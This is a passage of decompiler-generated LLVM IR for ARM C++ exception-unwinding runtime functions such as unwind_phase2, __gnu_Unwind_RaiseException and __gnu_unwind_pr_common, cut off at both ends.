  uselistorder i32* @r3, { 106, 107, 41, 42, 30, 108, 109, 33, 110, 111, 3, 112, 113, 114, 4, 115, 116, 117, 5, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 0, 136, 137, 138, 139, 31, 32, 34, 35, 36, 37, 38, 39, 40, 90, 64, 65, 66, 140, 141, 154, 155, 156, 144, 145, 146, 147, 148, 1, 149, 6, 44, 45, 142, 143, 57, 58, 103, 104, 105, 100, 101, 96, 97, 99, 98, 9, 10, 11, 160, 157, 158, 159, 2, 161, 162, 163, 43, 67, 46, 47, 48, 49, 50, 51, 150, 151, 152, 153, 59, 60, 61, 74, 75, 76, 77, 68, 69, 70, 8, 78, 79, 80, 81, 82, 24, 25, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 26, 27, 28, 29, 52, 53, 54, 102, 55, 56, 62, 63, 71, 7, 72, 73, 83, 84, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95 }
  uselistorder i32 10, { 4, 5, 31, 32, 33, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 34, 10, 26, 11, 27, 12, 28, 13, 29, 30, 23, 6, 35, 24, 14, 3, 25, 36, 15, 37, 38, 16, 17, 18, 41, 9, 46, 47, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 19, 59, 60, 61, 20, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 21, 73, 22 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_18160, { 1, 0 }
  uselistorder label %dec_label_pc_18104, { 1, 0 }
  uselistorder label %dec_label_pc_18100, { 1, 0 }
  uselistorder label %dec_label_pc_180b0, { 1, 0 }
  uselistorder label %dec_label_pc_1809c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_18174 = add i32 %ucbp, 12
  %v3_18174 = inttoptr i32 %v2_18174 to i32*
  store i32 %stop_fn, i32* %v3_18174, align 4
  %v3_18178 = add i32 %ucbp, 24
  %v4_18178 = inttoptr i32 %v3_18178 to i32*
  store i32 %tmp, i32* %v4_18178, align 4
  %v1_1817c = add i32 %entry_vrs, 60
  %v2_1817c = inttoptr i32 %v1_1817c to i32*
  %v3_1817c = load i32, i32* %v2_1817c, align 4
  %v2_18184 = add i32 %entry_vrs, 64
  %v3_18184 = inttoptr i32 %v2_18184 to i32*
  store i32 %v3_1817c, i32* %v3_18184, align 4
  %v3_1818c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1818c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_181a46 = add i32 %vrs, 64
  %v2_181a47 = inttoptr i32 %v1_181a46 to i32*
  %v3_181a48 = load i32, i32* %v2_181a47, align 4
  %v2_181a89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_181a48)
  store i32 %v2_181a89, i32* %r0.global-to-local, align 4
  %v2_181ac11 = icmp eq i32 %v2_181a89, 0
  br i1 %v2_181ac11, label %dec_label_pc_181b4, label %dec_label_pc_181e4

dec_label_pc_181b4:                               ; preds = %entry, %dec_label_pc_181b4.dec_label_pc_181a0_crit_edge
  %v0_181b4 = load i32, i32* @r5, align 4
  %v1_181b4 = add i32 %v0_181b4, 64
  %v2_181b4 = inttoptr i32 %v1_181b4 to i32*
  %v3_181b4 = load i32, i32* %v2_181b4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_181bc = load i32, i32* @r4, align 4
  %v2_181bc = add i32 %v1_181bc, 20
  %v3_181bc = inttoptr i32 %v2_181bc to i32*
  store i32 %v3_181b4, i32* %v3_181bc, align 4
  %v0_181c0 = load i32, i32* @r4, align 4
  %v1_181c8 = add i32 %v0_181c0, 16
  %v2_181c8 = inttoptr i32 %v1_181c8 to i32*
  %v3_181c8 = load i32, i32* %v2_181c8, align 4
  call void @__pseudo_branch(i32 %v3_181c8)
  %v0_181d4 = load i32, i32* %r0.global-to-local, align 4
  %v7_181d4 = icmp eq i32 %v0_181d4, 8
  br i1 %v7_181d4, label %dec_label_pc_181b4.dec_label_pc_181a0_crit_edge, label %dec_label_pc_181dc

dec_label_pc_181b4.dec_label_pc_181a0_crit_edge:  ; preds = %dec_label_pc_181b4
  %v0_181a0.pre = load i32, i32* @r4, align 4
  %v0_181a4.pre = load i32, i32* @r5, align 4
  store i32 %v0_181a0.pre, i32* %r0.global-to-local, align 4
  %v1_181a4 = add i32 %v0_181a4.pre, 64
  %v2_181a4 = inttoptr i32 %v1_181a4 to i32*
  %v3_181a4 = load i32, i32* %v2_181a4, align 4
  %v2_181a8 = call i32 @get_eit_entry(i32 %v0_181a0.pre, i32 %v3_181a4)
  store i32 %v2_181a8, i32* %r0.global-to-local, align 4
  %v2_181ac = icmp eq i32 %v2_181a8, 0
  br i1 %v2_181ac, label %dec_label_pc_181b4, label %dec_label_pc_181e4

dec_label_pc_181dc:                               ; preds = %dec_label_pc_181b4
  %v7_181dc = icmp eq i32 %v0_181d4, 7
  br i1 %v7_181dc, label %dec_label_pc_181e8, label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %entry, %dec_label_pc_181b4.dec_label_pc_181a0_crit_edge, %dec_label_pc_181dc
  %v0_181e4 = call i32 @abort()
  store i32 %v0_181e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181e8

dec_label_pc_181e8:                               ; preds = %dec_label_pc_181dc, %dec_label_pc_181e4
  %v0_181e8 = load i32, i32* @r5, align 4
  %v1_181e8 = add i32 %v0_181e8, 4
  store i32 %v1_181e8, i32* %r0.global-to-local, align 4
  %v1_181ec = inttoptr i32 %v1_181e8 to i32*
  %v2_181ec = call i32 @__restore_core_regs(i32* %v1_181ec)
  store i32 %v2_181ec, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 1, 2, 0 }
  uselistorder label %dec_label_pc_181e8, { 1, 0 }
  uselistorder label %dec_label_pc_181e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_181b4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_181f0 = add i32 %ucbp, 20
  %v2_181f0 = inttoptr i32 %v1_181f0 to i32*
  %v3_181f0 = load i32, i32* %v2_181f0, align 4
  %v1_181f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_181f8 = add i32 %v1_181f8, 64
  %v3_181f8 = inttoptr i32 %v2_181f8 to i32*
  store i32 %v3_181f0, i32* %v3_181f8, align 4
  %v1_181fc = add i32 %ucbp, 12
  %v2_181fc = inttoptr i32 %v1_181fc to i32*
  %v3_181fc = load i32, i32* %v2_181fc, align 4
  %v2_18200 = icmp eq i32 %v3_181fc, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1820c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1820c, i32* @r5, align 4
  br i1 %v2_18200, label %dec_label_pc_18214, label %dec_label_pc_18250

dec_label_pc_18214:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18220 = add i32 %ucbp, 16
  %v2_18220 = inttoptr i32 %v1_18220 to i32*
  %v3_18220 = load i32, i32* %v2_18220, align 4
  call void @__pseudo_branch(i32 %v3_18220)
  br i1 false, label %dec_label_pc_18248, label %dec_label_pc_18234

dec_label_pc_18234:                               ; preds = %dec_label_pc_18214
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_13008.545 to i32))
  %v0_1823c = load i32, i32* @r4, align 4
  %v0_18240 = load i32, i32* @r5, align 4
  store i32 %v0_18240, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1823c, i32 %v0_18240)
  br label %dec_label_pc_18248

dec_label_pc_18248:                               ; preds = %dec_label_pc_18214, %dec_label_pc_18234
  %v0_18248 = load i32, i32* @r5, align 4
  %v1_18248 = add i32 %v0_18248, 4
  %v1_1824c = inttoptr i32 %v1_18248 to i32*
  %v2_1824c = call i32 @__restore_core_regs(i32* %v1_1824c)
  %v1_18254.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18250

dec_label_pc_18250:                               ; preds = %entry, %dec_label_pc_18248
  %v1_18254 = phi i32 [ %v0_1820c, %entry ], [ %v1_18254.pre, %dec_label_pc_18248 ]
  %v3_18254 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18254, i32 1)
  %v0_18258 = call i32 @abort()
  ret i32 %v0_18258

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 42, 43, 44, 45, 46, 48, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 29, 53, 57, 56, 55, 49, 50, 37, 38, 39, 40, 41, 51, 52, 54, 32, 33, 47, 30, 34, 31, 23, 24, 0, 25, 26, 27, 28, 35, 36, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 95, 134, 4, 135, 136, 137, 138, 5, 80, 111, 139, 6, 79, 140, 7, 78, 141, 142, 143, 144, 8, 145, 112, 9, 82, 146, 10, 81, 147, 148, 11, 149, 150, 151, 12, 152, 153, 13, 154, 14, 114, 155, 156, 113, 157, 158, 15, 83, 16, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 18, 85, 19, 169, 170, 171, 20, 84, 172, 21, 17, 173, 174, 22, 175, 176, 177, 23, 178, 179, 180, 181, 182, 24, 25, 115, 26, 27, 28, 133, 86, 183, 184, 87, 185, 117, 186, 187, 30, 188, 189, 31, 88, 191, 29, 192, 190, 193, 116, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 90, 43, 44, 45, 46, 47, 212, 77, 91, 97, 198, 100, 99, 48, 194, 120, 195, 196, 51, 197, 89, 98, 199, 200, 201, 202, 92, 203, 204, 205, 206, 207, 52, 53, 208, 209, 49, 50, 210, 211, 119, 118, 54, 55, 56, 213, 57, 58, 101, 102, 107, 103, 108, 104, 106, 214, 105, 110, 215, 59, 216, 60, 217, 121, 122, 218, 123, 124, 219, 125, 126, 61, 62, 220, 127, 128, 63, 64, 221, 129, 130, 65, 66, 222, 131, 132, 67, 68, 96, 223, 224, 109, 225, 69, 93, 70, 71, 94, 72, 73, 74, 75, 76 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_18250, { 1, 0 }
  uselistorder label %dec_label_pc_18248, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1825c = load i32, i32* @r4, align 4
  store i32 %v3_1825c, i32* %stack_var_-16, align 4
  %v6_1825c = load i32, i32* @r5, align 4
  %v9_1825c = load i32, i32* @r6, align 4
  %v12_1825c = load i32, i32* @lr, align 4
  %v1_18260 = add i32 %entry_vrs, 60
  %v2_18260 = inttoptr i32 %v1_18260 to i32*
  %v3_18260 = load i32, i32* %v2_18260, align 4
  %v2_18264 = add i32 %entry_vrs, 64
  %v3_18264 = inttoptr i32 %v2_18264 to i32*
  store i32 %v3_18260, i32* %v3_18264, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18294 = load i32, i32* %v3_18264, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_182ac = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18294)
  %v2_182b0 = icmp eq i32 %v2_182ac, 0
  br i1 %v2_182b0, label %dec_label_pc_182b8, label %dec_label_pc_182ec

dec_label_pc_182b8:                               ; preds = %entry
  %v0_182b8 = load i32, i32* @r5, align 4
  %v1_182c0 = add i32 %v0_182b8, 16
  %v2_182c0 = inttoptr i32 %v1_182c0 to i32*
  %v3_182c0 = load i32, i32* %v2_182c0, align 4
  call void @__pseudo_branch(i32 %v3_182c0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_182d8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_182dc = urem i32 %v2_182d8, 2
  %v2_182dc = icmp eq i32 %v1_182dc, 0
  br i1 %v2_182dc, label %dec_label_pc_182fc, label %dec_label_pc_182e4

dec_label_pc_182e4:                               ; preds = %dec_label_pc_182b8, %dec_label_pc_182fc
  %v0_182e4 = phi i1 [ false, %dec_label_pc_182b8 ], [ %phitmp, %dec_label_pc_182fc ]
  br i1 %v0_182e4, label %dec_label_pc_18308, label %dec_label_pc_182ec

dec_label_pc_182ec:                               ; preds = %entry, %dec_label_pc_182e4
  %v2_182f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_182f4, i32* @r4, align 4
  store i32 %v6_1825c, i32* @r5, align 4
  store i32 %v9_1825c, i32* @r6, align 4
  store i32 %v12_1825c, i32* @lr, align 4
  ret i32 9

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182b8
  %v2_182fc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_182fc, i32* @r0, align 4
  %v1_18300 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_182fc)
  %v0_182e4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_182e4.pre, 6
  br label %dec_label_pc_182e4

dec_label_pc_18308:                               ; preds = %dec_label_pc_182e4
  %v0_18308 = load i32, i32* @r5, align 4
  %v0_1830c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18308, i32 %v0_1830c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_182ec, { 1, 0 }
  uselistorder label %dec_label_pc_182e4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18314 = add i32 %ucbp, 12
  %v2_18314 = inttoptr i32 %v1_18314 to i32*
  %v3_18314 = load i32, i32* %v2_18314, align 4
  %v2_18318 = icmp eq i32 %v3_18314, 0
  br i1 %v2_18318, label %dec_label_pc_18320, label %dec_label_pc_18324

dec_label_pc_18320:                               ; preds = %entry
  %v2_18320 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18324

dec_label_pc_18324:                               ; preds = %entry, %dec_label_pc_18320
  %v1_18324 = add i32 %entry_vrs, 60
  %v2_18324 = inttoptr i32 %v1_18324 to i32*
  %v3_18324 = load i32, i32* %v2_18324, align 4
  %v2_1832c = add i32 %entry_vrs, 64
  %v3_1832c = inttoptr i32 %v2_1832c to i32*
  store i32 %v3_18324, i32* %v3_1832c, align 4
  %v3_18330 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18330

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18324, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18390

bb:                                               ; preds = %entry
  %v7_18348 = mul i32 %regclass, 4
  %v8_18348 = add i32 %v7_18348, ptrtoint (i32* @global_var_18350.696 to i32)
  call void @__pseudo_branch(i32 %v8_18348)
  br label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18478 = load i32, i32* @r4, align 4
  %v6_18478 = load i32, i32* @r5, align 4
  %v2_18488 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18490 = add i32 %ucbp, 76
  %v2_18490 = inttoptr i32 %v1_18490 to i32*
  %v3_18490 = load i32, i32* %v2_18490, align 4
  %v1_1849c = inttoptr i32 %v3_18490 to i32*
  %v2_1849c = load i32, i32* %v1_1849c, align 4
  store i32 %v2_1849c, i32* @lr, align 4
  %v4_1849c = add i32 %v3_18490, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_184a8 = urem i32 %state, 4
  store i32 %v1_184a8, i32* %r2.global-to-local, align 4
  %v1_184ac = and i32 %state, 8
  store i32 %v1_184ac, i32* %r0.global-to-local, align 4
  %v4_184bc = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1849c, i32* %v4_184bc, align 8
  br i1 %v2_18488, label %dec_label_pc_184cc, label %dec_label_pc_187a8

dec_label_pc_184cc:                               ; preds = %entry
  %v3_184cc = mul i32 %v2_1849c, 256
  store i32 %v3_184cc, i32* %v4_184bc, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_184e4

dec_label_pc_184e4:                               ; preds = %dec_label_pc_187a8, %dec_label_pc_184cc
  %v0_18508647090 = phi i32 [ %v2_187c0, %dec_label_pc_187a8 ], [ %v4_1849c, %dec_label_pc_184cc ]
  store i32 %v1_184a8, i32* %r2.global-to-local, align 4
  %v1_184e8 = add i32 %ucbp, 80
  %v2_184e8 = inttoptr i32 %v1_184e8 to i32*
  %v3_184e8 = load i32, i32* %v2_184e8, align 4
  %v7_184ec = icmp eq i32 %v1_184a8, 2
  br i1 %v7_184ec, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_184e4
  %v2_184f0 = add i32 %ucbp, 56
  %v3_184f0 = inttoptr i32 %v2_184f0 to i32*
  %v4_184f0 = load i32, i32* %v3_184f0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_184e4, %bb
  %v0_185086470 = phi i32 [ %v0_18508647090, %dec_label_pc_184e4 ], [ %v4_184f0, %bb ]
  %v1_184f4 = urem i32 %v3_184e8, 2
  %v2_184f4 = icmp eq i32 %v1_184f4, 0
  br i1 %v2_184f4, label %dec_label_pc_18508.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_185c8

dec_label_pc_18508.preheader:                     ; preds = %bb148
  %v1_185086571 = inttoptr i32 %v0_185086470 to i32*
  %v2_185086672 = load i32, i32* %v1_185086571, align 4
  %v2_1850c6874 = icmp eq i32 %v2_185086672, 0
  br i1 %v2_1850c6874, label %dec_label_pc_185c8, label %dec_label_pc_18514.preheader.lr.ph.lr.ph

dec_label_pc_18514.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18508.preheader
  %v7_18518 = icmp eq i32 %id, 2
  %v2_185a4 = icmp eq i32 %v1_184a8, 0
  %v2_18770 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1868c = icmp eq i32 %v1_184ac, 0
  br label %dec_label_pc_18514.preheader.lr.ph

dec_label_pc_18514.preheader.lr.ph:               ; preds = %dec_label_pc_18514.preheader.lr.ph.lr.ph, %dec_label_pc_187dc
  %v1_1852496 = phi i32 [ %v2_185086672, %dec_label_pc_18514.preheader.lr.ph.lr.ph ], [ %v2_1850866, %dec_label_pc_187dc ]
  %v1_1852093 = phi i32 [ %v0_185086470, %dec_label_pc_18514.preheader.lr.ph.lr.ph ], [ %v2_187e0, %dec_label_pc_187dc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18514.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_187dc ]
  br label %dec_label_pc_18514.preheader

dec_label_pc_18514.preheader:                     ; preds = %dec_label_pc_18514.preheader.lr.ph, %dec_label_pc_187a0
  %v1_1852495 = phi i32 [ %v1_1852496, %dec_label_pc_18514.preheader.lr.ph ], [ %v2_18508, %dec_label_pc_187a0 ]
  %v1_1852092 = phi i32 [ %v1_1852093, %dec_label_pc_18514.preheader.lr.ph ], [ %v1_187a0, %dec_label_pc_187a0 ]
  br label %dec_label_pc_18514

dec_label_pc_18514:                               ; preds = %dec_label_pc_18514.preheader, %dec_label_pc_185b8
  %v1_18524 = phi i32 [ %v1_1852495, %dec_label_pc_18514.preheader ], [ %v2_185bc, %dec_label_pc_185b8 ]
  %v1_18538 = phi i32 [ %v1_1852092, %dec_label_pc_18514.preheader ], [ %v1_185b8, %dec_label_pc_185b8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18518, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18514
  %v2_1851c = add i32 %v1_18538, 4
  %v3_1851c = inttoptr i32 %v2_1851c to i32*
  %v4_1851c = load i32, i32* %v3_1851c, align 4
  store i32 %v4_1851c, i32* @r5, align 4
  store i32 %v1_18524, i32* @r6, align 4
  %v0_18528109 = load i32, i32* @r8, align 4
  %v1_18528110 = add i32 %v0_18528109, 72
  %v2_18528111 = inttoptr i32 %v1_18528110 to i32*
  %v3_18528112 = load i32, i32* %v2_18528111, align 4
  store i32 %v3_18528112, i32* @lr, align 4
  %v2_18534 = add i32 %v1_18538, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18514
  %v2_18520 = add i32 %v1_18538, 2
  %v3_18520 = inttoptr i32 %v2_18520 to i16*
  %v4_18520 = load i16, i16* %v3_18520, align 2
  %v5_18520 = zext i16 %v4_18520 to i32
  store i32 %v5_18520, i32* @r5, align 4
  %v0_18528 = load i32, i32* @r8, align 4
  %v1_18528 = add i32 %v0_18528, 72
  %v2_18528 = inttoptr i32 %v1_18528 to i32*
  %v3_18528 = load i32, i32* %v2_18528, align 4
  store i32 %v3_18528, i32* @lr, align 4
  %v2_18530 = inttoptr i32 %v1_18538 to i16*
  %v3_18530 = load i16, i16* %v2_18530, align 2
  %v4_18530 = zext i16 %v3_18530 to i32
  store i32 %v4_18530, i32* @r6, align 4
  %v2_18538 = add i32 %v1_18538, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18538, %.thread16 ], [ %v2_18534, %bb151 ]
  %v3_18528115 = phi i32 [ %v3_18528, %.thread16 ], [ %v3_18528112, %bb151 ]
  %v0_18540113 = phi i32 [ %v5_18520, %.thread16 ], [ %v4_1851c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18540 = and i32 %v0_18540113, -2
  %v2_18544 = add i32 %v1_18540, %v3_18528115
  store i32 %v2_18544, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18554 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18554, i32* %r0.global-to-local, align 4
  %v5_18560 = call i32 @_Unwind_VRS_Get(i32 %v0_18554, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18560, i32* %r0.global-to-local, align 4
  %v3_18564 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18564, i32* %r2.global-to-local, align 4
  %v0_18568 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18568, %v3_18564
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18574

._crit_edge:                                      ; preds = %bb152
  %v0_1858c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18574:                               ; preds = %bb152
  %v0_18574 = load i32, i32* @r6, align 4
  %v1_18574 = and i32 %v0_18574, -2
  %v2_18578 = add i32 %v1_18574, %v0_18568
  %v3_1857c = icmp ult i32 %v3_18564, %v2_18578
  br i1 %v3_1857c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18574
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18574
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1858c = phi i32 [ %v0_1858c.pre, %._crit_edge ], [ %v0_18574, %bb153 ], [ %v0_18574, %.thread20 ]
  %v0_18734 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18588 = load i32, i32* @r5, align 4
  %v1_1858c = urem i32 %v0_1858c, 2
  %v1_18588 = mul i32 %v0_18588, 2
  %v3_18590 = and i32 %v1_18588, 2
  %v4_18590 = or i32 %v3_18590, %v1_1858c
  store i32 %v4_18590, i32* %r2.global-to-local, align 4
  %v7_18594 = icmp eq i32 %v4_18590, 1
  br i1 %v7_18594, label %dec_label_pc_18728, label %dec_label_pc_1859c

dec_label_pc_1859c:                               ; preds = %bb154
  %v2_18594 = icmp eq i32 %v4_18590, 0
  br i1 %v2_18594, label %dec_label_pc_185a0, label %dec_label_pc_18650

dec_label_pc_185a0:                               ; preds = %dec_label_pc_1859c
  store i32 %v1_184a8, i32* %r2.global-to-local, align 4
  br i1 %v2_185a4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_185a0
  %v0_185b8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_185b8

bb155:                                            ; preds = %dec_label_pc_185a0
  %v2_185b0 = icmp eq i32 %v0_18734, 0
  %v0_185b8 = load i32, i32* @r7, align 4
  br i1 %v2_185b0, label %dec_label_pc_185b8, label %dec_label_pc_18930

dec_label_pc_185b8:                               ; preds = %.thread, %bb155
  %v0_185b8120 = phi i32 [ %v0_185b8119, %.thread ], [ %v0_185b8, %bb155 ]
  %v1_185b8 = add i32 %v0_185b8120, 4
  %v1_185bc = inttoptr i32 %v1_185b8 to i32*
  %v2_185bc = load i32, i32* %v1_185bc, align 4
  %v2_185c0 = icmp eq i32 %v2_185bc, 0
  br i1 %v2_185c0, label %dec_label_pc_185c8, label %dec_label_pc_18514

dec_label_pc_185c8:                               ; preds = %dec_label_pc_187dc, %dec_label_pc_187a0, %dec_label_pc_185b8, %dec_label_pc_18508.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18508.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_185b8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_187a0 ], [ %stack_var_-76.4, %dec_label_pc_187dc ]
  %v0_185c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_185c8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_185d0 = call i32 @__gnu_unwind_execute(i32 %v0_185c8, %anon_struct_13* %tmp156)
  store i32 %v4_185d0, i32* %r0.global-to-local, align 4
  store i32 %v4_185d0, i32* %r5.global-to-local, align 4
  %v2_185d4 = icmp eq i32 %v4_185d0, 0
  br i1 %v2_185d4, label %dec_label_pc_185dc, label %dec_label_pc_18658

dec_label_pc_185dc:                               ; preds = %dec_label_pc_185c8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_185e0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_185e0, label %bb157, label %dec_label_pc_185ec

bb157:                                            ; preds = %dec_label_pc_185dc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1865c

dec_label_pc_185ec:                               ; preds = %dec_label_pc_185dc
  %v2_185ec = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_185ec, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_185fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_185fc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18604 = call i32 @_Unwind_VRS_Get(i32 %v0_185fc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18608 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_185fc, i32* %r0.global-to-local, align 4
  %v5_1861c = call i32 @_Unwind_VRS_Set(i32 %v0_185fc, i32 %v0_18608, i32 14, i32 %v0_18608, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1861c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
